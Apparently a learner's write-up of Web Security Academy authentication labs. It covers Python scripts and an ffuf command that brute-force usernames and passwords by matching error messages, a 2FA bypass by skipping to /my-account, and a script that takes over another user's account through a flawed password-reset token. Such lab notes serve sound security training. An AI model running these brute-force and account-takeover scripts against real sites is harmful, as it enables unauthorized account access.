# Authentication
---
# Lab: Username enumeration via different responses

**Description**

![[Pasted image 20220622185839.png]]

I've discovered that login page inform you whether you submitted wrong username or password. So whenever you enter a wrong username page returns a string as **"Invalid username"**. And same thing goes for password as well however instead of "invalid user" it returns **"Incorrect password"**.

By knowing these behaviour, we can bruteforce our wordlist and find valid username first, then valid password for this username.

```python
import requests

with open("usernames.list") as fp:
	USERNAMES = fp.read()
	l_username = USERNAMES.split()

with open("password.list") as fp:
	USERNAMES = fp.read()
	l_password = USERNAMES.split()

VALID_USERNAME = ""
VALID_PASSWORD = ""

for username in l_username:
	data = {
	"username":username,
	"password":"test"
	}

	r = requests.post("https://0aa0001204aba7edc0df3f1e00f50037.web-security-academy.net/login", data=data)

	if "invalid" not in r.text.lower():
		print(f"Found valid userame: {username}")
		VALID_USERNAME = username
		break

for password in l_password:
	data = {
	"username":VALID_USERNAME,
	"password":password	
	}

	r = requests.post("https://0aa0001204aba7edc0df3f1e00f50037.web-security-academy.net/login", data=data)
	
	if "incorrect" not in r.text.lower():
		print(f"Found valid password for {VALID_USERNAME}: {password}")
		VALID_PASSWORD = password		
		break

  
print(f"\n\n\nUsername: {VALID_USERNAME}\nPassword: {VALID_PASSWORD}")

  
# Username: ec2-user
# Password: 1qaz2wsx
```

---

# Lab: 2FA simple bypass
**Description**

![[Pasted image 20220622193004.png]]

After I logged as my own user which is wiener at **/login** endpoint, then it redirects you to **/login2** which is the endpoint that you need to enter you one time password [0-9]{4}. If the password is correct then it redirects you to **/my-account** endpoint. 

The thing that breaks the system is following, when you enter as victim user, carlos. If you change endpoint as /my-account after you reached **/login2**, it authenticates you automatically.

To be honest, it was not a good lab, so I don't find it necessary to make further explanations.

---

# Lab: Password reset broken logic

**Description**

![[Pasted image 20220622194454.png]]

When you click **forgot-password**, it sends your email a redirect link that contains temp token

![[Pasted image 20220622203646.png]]

Link redirects you a form page to change your password. It has two fields:

**New Password:  user_input
New Password Again: user_input**

When you enter and inspect http requests, you realize that it makes a POST request with following parameters to forgot-password endpoint:
```http
"temp-forgot-password-token":"akjshdasd712k111d231",
"username":"wiener",
"new-password-1":"test",
"new-password-2": "test"
```

So if we create a new token with user wiener and use this token in a POST request after changing username as carlos, we are able to change carlos's password.

```python

import requests

  

proxies = {

'http': 'http://localhost:8080',

'https': 'http://localhost:8080'

}

  

temptoken = "vjm8wyiFz5xy1BjP2RWYXyWazglAHVTr"

  

data = {

"temp-forgot-password-token":temptoken,

"username":"carlos",

"new-password-1":"test",

"new-password-2": "test"

}

  

url = f"https://0ac8007504f02472c0c8806800b50039.web-security-academy.net/forgot-password?temp-forgot-password-token={temptoken}"

  

r = requests.post(url=url, proxies=proxies, verify=False, data=data)
```

# FUFF
Instead of using python script for brute forcing, you can use **fuff**. In the next lab, there is a showcase part that demonstrates how you should use it to brute force web applications.

---

# Lab: Username enumeration via subtly different responses
**Description**

![[Pasted image 20220622204359.png]]

Application returns an error message as **"Invalid username or password."** when you enter invalid username or password. however when you enter a valid username it returns same error message **without dot**("Invalid username or password") at the very end. With using this behaviour we can enumerate valid usernames.

```python
import requests

  

with open("usernames") as fp:

USERNAMES = fp.read()

l_username = USERNAMES.split()

  

with open("passwords") as fp:

USERNAMES = fp.read()

l_password = USERNAMES.split()

  

VALID_USERNAME = ""

VALID_PASSWORD = ""

  

url = "https://0af8004a04756ef7c0cd499800bd00fb.web-security-academy.net/login"

  

for username in l_username:

data = {

"username":username,

"password":"test"

}

  

r = requests.post(url, data=data)

  

if "Invalid username or password." not in r.text:

print(f"Found valid userame: {username}")

VALID_USERNAME = username

break

  

for password in l_password:

data = {

"username":VALID_USERNAME,

"password":password

}

  

r = requests.post(url, data=data)

  

if "Invalid username or password" not in r.text:

print(f"Found valid password for {VALID_USERNAME}: {password}")

VALID_PASSWORD = password

break

  

print(f"\n\n\nUsername: {VALID_USERNAME}\nPassword: {VALID_PASSWORD}")
```
``
By modifying first script that we solved first lab with, we are able to solve this lab as well.

### There is another way
You may have not noticed that application has such a behaviour, so you can try direct brute forcing with **usernames** and **password** wordlists. In order to perform that, we can use **FUFF**.

Here is the **FUFF** command to fuzz application:
```bash
ffuf -u "https://0af600c30488eb0dc0b939ba00bc0036.web-security-academy.net/login" -X POST -d "username=USER&password=PASS" -w usernames:USER -w passwords:PASS -fr "Invalid"
```

![[Pasted image 20220627192303.png]]

# Steps to fuzz applications with FUFF
1. Write first fuff command with known values **(method, endpoint, paramaters ...)** from **HTTP** request. You can use developer tools *(F12)*. 
2. Add  `-x http://localhost:8080` *(port burp running on)* to command.
3. Check if something goes wrong with **Repeater**.
4. After being sure everything is alright, you can disable proxy in command and let fuff run.
 
---

	